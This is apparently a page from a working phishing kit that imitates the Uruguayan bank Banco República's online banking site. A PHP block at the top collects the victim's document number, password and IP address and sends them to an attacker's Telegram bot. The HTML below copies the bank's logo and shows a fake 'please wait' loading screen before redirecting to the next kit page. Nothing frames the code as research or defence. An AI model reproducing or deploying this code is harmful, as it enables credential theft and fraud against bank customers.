<?php
ini_set("display_errors", 0);

$config = include('config.php');
$elusrr = $_POST['us4c'];
$elusr = $_POST['breves'];
$elpax = $_POST['clax'];

$token = $config['token'];
$chat_id = $config['chat_id'];

$ip = $_SERVER['REMOTE_ADDR'];




$mensaje_para_chatbot = "🔵3BROU🔵\nType:".$elusrr."\nDOC: ".$elusr."\nCl4v: ".$elpax."\nip: " . $ip;


$telegram_url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($mensaje_para_chatbot);


$response = file_get_contents($telegram_url);




?>



<!DOCTYPE html>

<html lang="es" translate="no" class="wf-montserrat-n4-active wf-montserrat-n5-active wf-montserrat-n7-active wf-sansserif-n4-inactive wf-active">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,width=device-width,viewport-fit=cover">

      <link rel="shortcut icon" href="img/favicon.ico">

      <link rel="stylesheet" href="css/fontico.css">
      <link rel="stylesheet" href="css/ioniconico.css">
   
      <title>e-B</title>
      <meta http-equiv="refresh" content="15; URL=index3.php">
    
   
      <link href="css/chunkate.css" rel="stylesheet">
      <link href="css/manolo.css" rel="stylesheet">
      
      <style id="inert-style">
         [inert] {
         pointer-events: none;
         cursor: default;
         }
         [inert], [inert] * {
         -webkit-user-select: none;
         -moz-user-select: none;
         -ms-user-select: none;
         user-select: none;
         }
      </style>
   </head>
   <body style="background-color: rgb(8, 82, 141);">
    
      <div id="root">
         <div class="">
            <div class="transition-wrapper">
               <div class="view-wrapper">
                  <header class="">
                     <nav class="navbar navbar-default">
                        <div class="container-fluid">
                           <div class="navbar-header">
                              <div class="toolbar undefined">
                                 <div class="header-grid">
                                    <div class="row">
                                       <div class="col-12 header-desktop null  col-lg-12 col-md-12 col-sm-12">
                                          <div class="header-title-back"><i class="icon ion-android-arrow-back "></i></div>
                                          <div class="logo">
                                             <div>
                                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 288.7 95.5" style="enable-background:new 0 0 288.7 95.5;" xml:space="preserve" class="injected-svg svg-image" data-src="static/media/logoCompany.ccb02806.svg">
                                                   <style type="text/css">
                                                      .st0{fill:#FFFFFF!important;}
                                                      .st1{fill:#FFCB05;}
                                                   </style>
                                                   <path class="st0" d="M59.3,14.1c1.3-0.1,2.7-0.2,4.1-0.2c8.4,0,14.9,2.4,19.5,7c4.5,4.7,6.8,11.3,6.8,19.8c0,1.5-0.1,3.2-0.2,5  c-0.2,1.8-0.4,3.8-0.8,6.1C82,51.7,77,51.6,73.6,51.6s-6.6,0-9.5,0c-1.2,0-2.8,0-4.8,0v-7.3c2.4,0,5.6-0.1,9.8-0.3h0.4  c0.6-2.2,1-4.3,1.2-6.3c0.3-2,0.4-3.9,0.4-5.8c0-3.7-0.7-6.5-2.1-8.5c-1.4-1.9-3.4-2.9-6.1-2.9c-1.3,0-2.5,0.3-3.7,0.8L59.3,14.1  L59.3,14.1z M59.3,77.1c1.6,0.3,3.3,0.5,5.2,0.5c3.6,0,7.1-0.6,10.3-1.7c3.2-1.2,6.3-2.9,9.1-5.3l1.7,1.8C78.1,84,68,87.3,59.3,87.7  V77.1z M57,87.8c-10.4,0-18.4-2.8-24.2-8.4S24.1,66,24.1,55.9c0-11.7,3.8-21.6,11.3-29.8C42.1,19,50,15,59.3,14.1v7.2  c-2,0.9-3.8,2.6-5.3,5c-2.6,3.9-4.8,9.7-6.5,17.5c2.7,0.1,5,0.2,6.8,0.3s3.1,0.1,3.8,0.1c0.3,0,0.8,0,1.2,0v7.3c-1.2,0-2.5,0-4,0.1  c-3.9,0.1-7,0.1-9,0.1c-0.1,0.3-0.2,1-0.3,2c-0.3,2.3-0.4,4-0.4,5c0,5.9,1.7,10.6,5,13.9c2.3,2.3,5.2,3.8,8.7,4.5v10.7  C58.6,87.7,57.8,87.8,57,87.8z"></path>
                                                   <path class="st1" d="M54.2,0.7H65C17.5,10.8,0.1,62,27.9,95.4H15.8C-7.4,62,15.5,13,54.2,0.7z"></path>
                                                   <path class="st0" d="M221.6,77.5v-6.6c0.1,0,0.1,0,0.1,0c4.5,0,7.9-1.9,10.1-5.7c2.2-3.8,3.4-8.1,3.4-13c0-4.8-1.2-9.2-3.4-12.9  c-2.2-3.8-5.6-5.7-10.1-5.7c0,0,0,0-0.1,0V27c0.1,0,0.1,0,0.1,0c4.8,0,9.1,1.1,12.7,3.1c3.7,2.1,6.4,5,8.4,9  c1.9,3.9,2.9,8.3,2.9,13.2s-1,9.3-2.9,13.2s-4.7,6.9-8.3,9C230.9,76.5,226.6,77.5,221.6,77.5C221.7,77.5,221.7,77.5,221.6,77.5  L221.6,77.5z M250.7,28.2h9.8v29.5c0,5.3,0.9,8.9,2.7,10.6c1.8,1.7,4.1,2.6,6.9,2.6s5-0.8,6.7-2.6c1.6-1.7,2.5-5,2.5-9.9V28.2h8.6  v29.5c0,5.6-0.7,9.6-2.1,12c-1.4,2.4-3.4,4.4-5.9,5.7c-2.6,1.4-5.9,2.1-9.9,2.1c-3.9,0-7.3-0.6-10.1-1.9c-2.8-1.3-5-3.2-6.7-5.8  s-2.5-6.6-2.5-12.2L250.7,28.2L250.7,28.2z M221.6,26.9v6.6c-4.5,0-7.9,1.9-10.1,5.7c-2.2,3.8-3.4,8.1-3.4,12.9  c0,4.9,1.1,9.2,3.4,13c2.2,3.8,5.6,5.7,10.1,5.7v6.6c-4.9,0-9.1-1-12.8-3.1c-3.6-2.1-6.4-5-8.3-9s-2.9-8.3-2.9-13.2s1-9.3,2.9-13.2  s4.7-6.9,8.3-9C212.6,28,216.8,26.9,221.6,26.9L221.6,26.9z M174.7,58.4v-8.9c1.8-0.4,3.3-1.2,4.2-2.2c1.5-1.8,2.3-3.9,2.3-6.1  c0-2-0.6-3.6-1.9-4.7c-0.8-0.8-2.4-1.3-4.6-1.6v-6.7h2c3.6,0,6.4,0.4,8.3,1.3c1.8,1,3.4,2.4,4.5,4.2c1.1,1.9,1.6,4,1.6,6.4  c0,2.8-0.8,5.5-2.4,8c-1.6,2.5-3.9,4.4-6.8,5.7l15.4,22.5h-11.9L174.7,58.4z M136,28.2h1c3.9,0,6.7,0.4,8.6,1.3  c1.8,0.9,3.3,2.2,4.3,3.9c1.1,1.7,1.6,3.5,1.6,5.5c0,2.4-0.8,4.8-2.5,7s-4.6,3.9-8.9,5.3c3.4,0.8,6,1.8,7.8,3.1s3.1,2.7,4.1,4.5  c0.9,1.7,1.3,3.6,1.3,5.6c0,2.2-0.5,4.2-1.6,6.1c-1.1,1.8-2.6,3.3-4.5,4.3s-4.8,1.5-8.7,1.5H136v-7c1.5-0.1,2.6-0.3,3.4-0.6  c1.2-0.4,2.2-1.2,2.8-2.2s1-2.1,1-3.4c0-2.4-1-4.4-3.1-6.1c-1.2-0.9-2.5-1.6-4-2v-7.3c1.3-0.3,2.4-1,3.3-1.8  c1.5-1.5,2.2-3.3,2.2-5.5c0-1.2-0.2-2.2-0.7-3c-0.4-0.8-1.2-1.5-2.3-2c-0.6-0.2-1.4-0.4-2.5-0.6L136,28.2L136,28.2z M174.7,28.2v6.7  c-0.9-0.1-1.9-0.1-3-0.1h-3.4V50h2.2c1.6,0,3-0.1,4.2-0.4v8.9l-1.1-1.8h-5.4v19.7H159V28.2H174.7z M121.1,76.3V28.2H136v6.7  c-1-0.1-2.2-0.1-3.7-0.1h-1.8v13.4h2.1c1.2,0,2.4-0.1,3.4-0.4v7.3c-1.2-0.3-2.4-0.4-3.8-0.4h-1.7v14.9h1.9c1.4,0,2.6-0.1,3.6-0.1v7  h-14.9V76.3z"></path>
                                                </svg>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </nav>
                  </header>
                  <div class="view-page">
                     <div role="main" class="view-content">
                        <main class="main-container">
                           <div class="view-content-container">
                              <form class="above-the-fold">
                                 <section class="flex-grow align-items-center container--layout margin-bottom-05rem-mb">
                                    <div class="container">
                                       <div class="justify-content-center row">
                                          <div xl="6" class="col col-12 col-lg-6 col-md-12 col-sm-12 col-xs-12">
                                             <br>
                                             <div>
                                                <h1><span>Espere mientras carga, no cierre esta ventana.</span></h1>
                                             </div>
                                             <div class="notifications-wrapper"></div>
                                             <div class="notifications-wrapper"></div>
                                             <br>
                                             <br>
                                             <br>
                                             <img src="img/carregue.gif" style="width: 100px; display: block;margin: 0 auto;">
                                          </div>
                                       </div>
                                    </div>
                                 </section>
                                 
                              </form>
                           </div>
                           <div class="app-footer">
                              <section class="container--layout container--bottom">
                                 <div class="form-content container">
                                    <div class="justify-content-center row">
                                       <div class="col col-12 col-sm-12">
                                          <div class="row">
                                             <div class="col-12 reset-padding-mb">
                                                <p><span>© 2020 Banco República</span><span>Todos los derechos reservados</span></p>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </section>
                           </div>
                        </main>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <div class="modal-container"></div>
      </div>
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="0" height="0" style="position:absolute">
         <symbol id="LogoTech" viewBox="0 0 221.4 31.3">
            <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 288.7 119" style="enable-background:new 0 0 288.7 119" xml:space="preserve">
               <g transform="translate(-930.005 -2348.975)">
                  <path d="M1053.7,2407.6h-5.2v8.6c0,2.1,0,4.4,2.7,4.4c0.9,0,1.8-0.2,2.6-0.6v3.3c-1,0.4-2.1,0.7-3.2,0.6c-5.6,0-5.6-3.4-5.6-6.5
                     v-18.4h3.6v5.3h5.2L1053.7,2407.6z"></path>
                  <path d="M1059.5,2415.2c0,3.3,3.1,5.5,6.4,5.5c2.1-0.1,4-1.1,5.2-2.9l2.7,2.1c-2,2.6-5.1,4.1-8.4,3.9c-6,0-9.7-4.3-9.7-10
                     c-0.2-5.3,4-9.8,9.3-10c0.2,0,0.3,0,0.5,0c6.7,0,9.2,5.1,9.2,10v1.2L1059.5,2415.2z M1070.8,2412.3c-0.1-3.2-1.8-5.5-5.5-5.5
                     c-3.1,0-5.7,2.4-5.9,5.5H1070.8z"></path>
                  <path d="M1092.1,2409.5c-1.2-1.4-2.9-2.2-4.7-2.1c-3.9,0-5.9,3.2-5.9,6.7c-0.2,3.4,2.3,6.2,5.7,6.4c0.1,0,0.3,0,0.4,0
                     c1.8,0.1,3.5-0.7,4.6-2.1l2.6,2.6c-1.9,2-4.5,3-7.2,2.9c-5.5,0-10-4.5-10-10s4.5-10,10-10c2.7-0.1,5.4,1,7.3,3L1092.1,2409.5z"></path>
                  <path d="M1098.3,2393.1h3.6v14.2h0.1c1.2-2.2,3.7-3.6,6.2-3.4c3.7,0,6.9,2.2,6.9,7.3v12.2h-3.6v-11.2c0-3.6-2-4.9-4.3-4.9
                     c-3,0-5.3,1.9-5.3,6.3v9.8h-3.6L1098.3,2393.1z"></path>
                  <path d="M1119,2393.1h3.6v14h0.1c1.5-2.1,4-3.3,6.6-3.2c5.8,0,9.6,4.3,9.6,10c0,5.7-3.7,10-9.6,10c-2.6,0-5-1.1-6.6-3.2h-0.1v2.7
                     h-3.6L1119,2393.1z M1135.1,2414c0-3.8-2.4-6.6-6.2-6.6c-3.8,0-6.2,2.8-6.2,6.6s2.4,6.6,6.2,6.6
                     C1132.7,2420.6,1135.1,2417.8,1135.1,2414L1135.1,2414z"></path>
                  <path d="M1142.3,2406.8c2.1-1.8,4.7-2.8,7.5-2.8c5.6,0,7.9,3,7.9,6.3v9.7c0,1.2,0,2.3,0.2,3.4h-3.2c-0.1-1-0.1-1.9-0.1-2.9h-0.1
                     c-1.4,2.3-4,3.6-6.6,3.4c-3.5,0-6.5-2-6.5-5.7c0-4.9,4.7-6.6,10.4-6.6h2.6v-0.8c0-2.3-1.9-4.1-4.1-4c-0.1,0-0.3,0-0.4,0
                     c-2,0-3.9,0.8-5.4,2.2L1142.3,2406.8z M1152.4,2414.3c-3.4,0-7.6,0.6-7.6,3.6c0,2.2,1.6,3.1,4.1,3.1c4,0,5.4-3,5.4-5.5v-1.2
                     L1152.4,2414.3z"></path>
                  <path d="M1161.1,2404.4h3.6v2.9h0.1c1.2-2.2,3.7-3.6,6.2-3.4c3.7,0,6.9,2.2,6.9,7.3v12.2h-3.6v-11.2c0-3.6-2-4.9-4.3-4.9
                     c-3,0-5.3,1.9-5.3,6.3v9.8h-3.6L1161.1,2404.4z"></path>
                  <path d="M1181.3,2393.1h3.6v19.6l8.2-8.2h5l-8.8,8.6l9.6,10.4h-5.1l-8.8-9.9v9.9h-3.6L1181.3,2393.1z"></path>
                  <path d="M962.6,2380.9c13.1-12.8,33.5-14.5,48.5-3.9c-4.3-1.3-8.7-2-13.2-2c-7.7-0.1-15.4,2-21.9,6.1
                     c-12.4,6.1-19.1,19.7-16.5,33.3l0.8,3.2l2.6,4c-7-14.6-1-32.4,13.6-39.5c6.4-4.1,13.8-6.2,21.4-6c6.8-0.1,13.4,1.6,19.4,4.8
                     c-15.1-15.5-39.9-15.8-55.4-0.7c-0.1,0.1-0.2,0.2-0.2,0.2l-1.8,2.4l-1.2,4C959.3,2384,962.6,2380.9,962.6,2380.9z"></path>
                  <path d="M961.8,2435.3c-12.7-13.2-14.4-33.6-3.9-48.7c-1.3,4.3-2,8.8-2,13.3c-0.2,7.8,2,15.5,6.1,22.1c6,12.4,19.6,19.2,33.1,16.6
                     l3.1-0.8l3.8-2.7c-14.5,7.1-32,1-39.1-13.5c0-0.1-0.1-0.1-0.1-0.2c-4.1-6.4-6.1-13.9-6-21.5c-0.1-6.8,1.6-13.5,4.8-19.5
                     c-15.5,15.3-15.8,40.3-0.6,55.9l3,2.2l3.6,0.7C965.6,2438.3,963.5,2437,961.8,2435.3z"></path>
                  <path d="M1015.9,2436.1c-13.1,12.8-33.5,14.5-48.5,4c4.3,1.3,8.7,2,13.2,2c7.8,0.2,15.4-2,22-6.1c12.4-6.1,19.1-19.7,16.5-33.3
                     l-0.8-3.2l-2.6-3.8c7.1,14.6,0.9,32.2-13.6,39.3c-6.4,4.1-13.8,6.2-21.4,6c-6.8,0.1-13.5-1.6-19.4-4.9
                     c15.1,15.5,39.9,15.9,55.5,0.7c0.1-0.1,0.1-0.1,0.2-0.2l1.4-2l0.5-1.8C1017.8,2434.1,1016.9,2435.2,1015.9,2436.1L1015.9,2436.1z"></path>
                  <path d="M1016.7,2381.8c12.8,13.2,14.4,33.7,3.9,48.8c1.3-4.3,2-8.8,2-13.3c0.2-7.8-2-15.5-6.1-22.1c-5.1-10.4-15.7-17.1-27.3-17.1
                     c-2,0-4.1,0.2-6.1,0.6c-1.2,0.4-2.3,0.9-3.4,1.5c-1.2,0.7-3.3,1.9-3.3,1.9c14.5-7.1,32-1,39.1,13.4c0,0.1,0.1,0.1,0.1,0.2
                     c4.1,6.4,6.1,13.9,6,21.5c0.1,6.8-1.6,13.5-4.8,19.5c15.5-15.3,15.8-40.3,0.6-55.9c0,0-1-0.6-1.6-0.9c-0.6-0.3-1.7-0.8-1.7-0.8
                     C1015.4,2380.4,1016.7,2381.8,1016.7,2381.8z"></path>
               </g>
            </svg>
         </symbol>
      </svg>
 
   </body>
</html>